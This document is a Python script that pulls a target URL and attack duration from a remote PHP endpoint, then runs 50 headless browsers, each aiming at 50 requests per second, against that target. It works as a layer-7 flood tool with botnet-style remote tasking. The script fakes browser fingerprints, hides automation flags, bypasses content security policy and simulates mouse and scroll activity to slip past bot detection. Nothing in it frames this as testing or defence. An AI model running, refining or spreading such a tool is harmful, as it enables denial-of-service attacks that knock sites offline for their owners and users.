#!/usr/bin/env python3
from playwright.sync_api import sync_playwright
import time, random, threading, urllib.parse, signal, sys, xml.etree.ElementTree as ET
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style

init(autoreset=True)

API_URL = "https://labaidgroup.com/files/google_security2025992852991526.php"
THREADS = 50
RPS_PER_THREAD = 50.0
RETRY_LIMIT = 3
RETRY_DELAY = 1

class Stats:
    def __init__(self): self.t = self.e = 0; self.c = {}; self.l = threading.Lock()
    def add(self, code):
        with self.l:
            self.t += 1
            if code not in [200, 301, 302]: self.e += 1
            self.c[code] = self.c.get(code, 0) + 1
    def get(self): 
        with self.l: return self.t, self.e, dict(self.c)

def signal_handler(signum, frame):
    print(f"\n{Fore.RED}Shutting down gracefully...{Style.RESET_ALL}")
    raise KeyboardInterrupt

def fetch_config():
    attempt = 0
    while attempt < RETRY_LIMIT:
        try:
            req = urllib.request.Request(
                API_URL,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                raw = resp.read().decode('utf-8', errors='ignore').strip()
            
            if not raw or '<data>' not in raw:
                raise ValueError("Invalid or empty response")

            print(f"{Fore.CYAN}Raw XML: {raw[:200]}{'...' if len(raw) > 200 else ''}{Style.RESET_ALL}")

            root = ET.fromstring(raw)
            url_elem = root.find('url')
            time_elem = root.find('time')

            if url_elem is None or time_elem is None:
                raise ValueError("Missing <url> or <time>")

            url = url_elem.text.strip() if url_elem.text else ""
            if not url.startswith("http"):
                url = "https://" + url
            dur = int(time_elem.text.strip())

            return url, dur

        except ET.ParseError as e:
            print(f"{Fore.RED}XML Parse Error (Attempt {attempt + 1}): {e}")
            print(f"{Fore.RED}Raw: {raw if 'raw' in locals() else 'N/A'}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Fetch failed (Attempt {attempt + 1}): {e}")
        
        attempt += 1
        if attempt < RETRY_LIMIT:
            time.sleep(RETRY_DELAY)

    print(f"{Fore.RED}Failed to fetch config after {RETRY_LIMIT} attempts{Style.RESET_ALL}")
    sys.exit(1)

def worker(tid, url, dur, stats, stop, last, target_rps):
    browser = None
    page = None
    try:
        start = time.time()
        interval = 1.0 / target_rps
        next_time = start
        mouse_moves = 0
        scroll_amount = 0

        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                    "--disable-images", "--disable-extensions", "--single-process",
                    "--disable-background-timer-throttling", "--disable-renderer-backgrounding",
                    "--disable-backgrounding-occluded-windows", "--no-default-browser-check"
                ]
            )
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
                viewport={'width': 360, 'height': 640},
                java_script_enabled=True,
                bypass_csp=True,
                ignore_https_errors=True
            )
            context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                window.chrome = { runtime: {} };
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            """)
            page = context.new_page()

            while time.time() - start < dur and not stop.is_set():
                now = time.time()
                if now < next_time:
                    time.sleep(min(0.01, next_time - now))
                    continue

                try:
                    for _ in range(3):
                        x = random.randint(50, 300)
                        y = random.randint(50, 500)
                        page.mouse.move(x, y)
                        mouse_moves += 1
                    page.evaluate("window.scrollBy(0, 300)")
                    scroll_amount += 300

                    resp = page.goto(url, wait_until="domcontentloaded", timeout=8000)
                    code = resp.status if resp else 0

                    params = urllib.parse.urlencode({
                        'update': '1', 'js_valid': 'true',
                        'mouse': mouse_moves, 'scroll': int(scroll_amount)
                    })
                    try:
                        page.goto(f"{url}?{params}", wait_until="commit", timeout=3000)
                    except: pass

                    stats.add(code)
                    last[0] = str(code)
                except:
                    code = 0
                    stats.add(code)
                    last[0] = str(code)

                next_time += interval
                if time.time() > next_time + 0.5:
                    next_time = time.time() + interval

    except Exception as e:
        pass
    finally:
        try:
            if page: page.close()
            if browser: browser.close()
        except: pass

def main():
    URL, DUR = fetch_config()
    stats = Stats()
    stop = threading.Event()
    last = ["---"]
    st = time.time()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    total_rps = THREADS * RPS_PER_THREAD
    print(f"{Fore.GREEN}{Style.BRIGHT}Target: {URL}")
    print(f"{Fore.YELLOW}Duration: {DUR}s | Browsers: {THREADS} | RPS/Browser: {RPS_PER_THREAD}")
    print(f"{Fore.CYAN}Total: ~{total_rps:.1f} RPS | Auto-config from API")
    print("="*80)

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(worker, i, URL, DUR, stats, stop, last, RPS_PER_THREAD) for i in range(THREADS)]

        try:
            while any(f.running() for f in futures) and time.time() - st < DUR:
                el = int(time.time() - st)
                t, e, c = stats.get()
                rate = t / max(el, 1)
                prog = min(el/DUR, 1)
                bar = "█"*int(30*prog) + "░"*(30-int(30*prog))
                col = Fore.CYAN if last[0] in ["200","301"] else Fore.RED
                print(f"\r{Fore.WHITE}[{el:2d}s] {Fore.CYAN}{bar} {prog*100:5.1f}% | "
                      f"{Fore.YELLOW}Req: {t:5d} | {Fore.RED}Err: {e:3d} | "
                      f"{Fore.GREEN}Rate: {rate:6.1f}/s | Last: {col}{last[0]}{Style.RESET_ALL}", end="", flush=True)
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Stopping all browsers...{Style.RESET_ALL}")
            stop.set()
            time.sleep(1)

    final = time.time() - st
    t, e, c = stats.get()
    success = (t-e)/t*100 if t > 0 else 0
    print("\n" + "="*80)
    print(f"{Fore.GREEN}{Style.BRIGHT}Finished in {final:.1f}s")
    print(f"{Fore.YELLOW}Total: {t} | Errors: {e} | Success: {success:.1f}%")
    print(f"{Fore.MAGENTA}Avg Rate: {t/final:.2f} req/s")
    if c: print(f"{Fore.WHITE}Codes: {' | '.join([f'{k}:{v}' for k,v in c.items()])}")
    print("="*80)

if __name__ == "__main__":
    main()
